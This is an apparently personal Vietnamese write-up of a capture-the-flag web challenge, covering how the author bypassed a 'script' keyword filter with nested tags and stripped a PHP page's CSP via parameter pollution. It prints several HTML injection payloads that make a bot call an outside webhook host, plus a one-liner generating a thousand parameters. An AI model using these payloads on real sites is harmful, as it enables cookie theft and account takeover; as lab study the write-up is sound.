

---
Tài liệu/Bài báo tham khảo:
https://phrack.org/issues/72/the-art-of-php-my-ctf-journey-and-untold-stories_md
https://hacktricks.wiki/en/index.html

---

Bài này mình mở ticket nhờ các anh được các anh gợi ý mới giải được 😭 Suýt trầm cảm khi giải bài này 🤧

![Pasted image 20261020202523](Attachments/Pasted%20image%2020261020202523.png)

Mình check CSP thì thấy oke phết, nên chủ quan không xem kĩ bypass CSP và sau đó phải hối hận😭 
Cũng do là mình đã check kĩ rằng server không host JSONP hay AngularJS và ko có file JS đặc biệt nào ở client side🤔
![Pasted image 20261020202908](Attachments/Pasted%20image%2020261020202908.png)
Mình cũng check DOM XSS bằng extension của Burp nhưng cũng không thấy gì đặc biệt:


![Pasted image 20261020204949](Attachments/Pasted%20image%2020261020204949.png)



Lúc này mình thấy server có một cái khá lạ - xóa 'script' trong payload nếu xuất hiện:

![Pasted image 20261020211656](Attachments/Pasted%20image%2020261020211656.png)
![Pasted image 20261020211715](Attachments/Pasted%20image%2020261020211715.png)

Kết quả khi truyền scrscriptipt vào lại ra script :)) đến đây mình nghi nghi hướng này:
![Pasted image 20261020211725](Attachments/Pasted%20image%2020261020211725.png)

Thế là giờ mình chế được các script dạng như sau và đã redirect/ép bot gửi request về webhook thành công:
- `<styscriptle>body{background:url('https://e40d3b3c-ab0f-44e3-8d07-4a556f73ba8e.webhooksite.net/?css_works=true')}</styscriptle>`
    
- `<mescriptta http-equiv="refresh" content="0;url=https://e40d3b3c-ab0f-44e3-8d07-4a556f73ba8e.webhooksite.net/?meta_redirect=true">`
    
- `<forscriptm action="https://e40d3b3c-ab0f-44e3-8d07-4a556f73ba8e.webhooksite.net/" method="POST"><input name="data" value="test"></forscriptm>`
    
- `<ifrscriptame src="https://e40d3b3c-ab0f-44e3-8d07-4a556f73ba8e.webhooksite.net/?iframe_works=true"></ifrscriptame>`
    
...
Nhưng vấn đề là script-src là 'self' nên mình chưa nghĩ ra cách nào để đọc được cookie từ trang web.
Mình để ý thêm thì thấy ở endpoint report.php không có CSP nhưng cũng ko lợi dụng được gì:
![Pasted image 20261023110609](Attachments/Pasted%20image%2020261023110609.png)
Lúc này bí quá, thử đủ mọi kiểu trên đời. AI nó còn bảo CSS injection hay HTML smuggling, DOM XSS gì ấy nhưng mình thấy con AI cứ ngáo ngáo, vòng vo nên mình ức chế vl :))) bí quá nên mình quyết định mở ticket nhờ mấy anh trong clb hỏi xem có lỗi/có endpoint ẩn hay gợi ý gì không.

Thế là 2 anh mới bảo mình đọc: https://phrack.org/issues/72/the-art-of-php-my-ctf-journey-and-untold-stories_md rồi từ đó mình mới hiểu ra là phải kết hợp với điểm yếu của PHP nữa ảo thật:))

Kĩ thuật ở đây là Parameter Pollution nhé, payload như sau:
Mình sẽ tạo hàng loạt param khác nhau
```python
"&P=".join(['']+[str(i) for i in range(1,1001)])
```
Sau đó thêm vào sau 'msg' như sau:

![Pasted image 20261024225721](Attachments/Pasted%20image%2020261024225721.png)

Lúc này thì PHP sẽ ném ra một cái warning từ đó làm mất CSP:
![Pasted image 20261024225800](Attachments/Pasted%20image%2020261024225800.png)

Khi đó thì CSP trigger thành công !!!!:
![Pasted image 20261024225904](Attachments/Pasted%20image%2020261024225904.png)


Cơ chế hoạt động của nó đây nhé:
![Pasted image 20261024230056](Attachments/Pasted%20image%2020261024230056.png)

Ảo thật sự, mình rút ra bài học là phải chăm đọc hơn :))



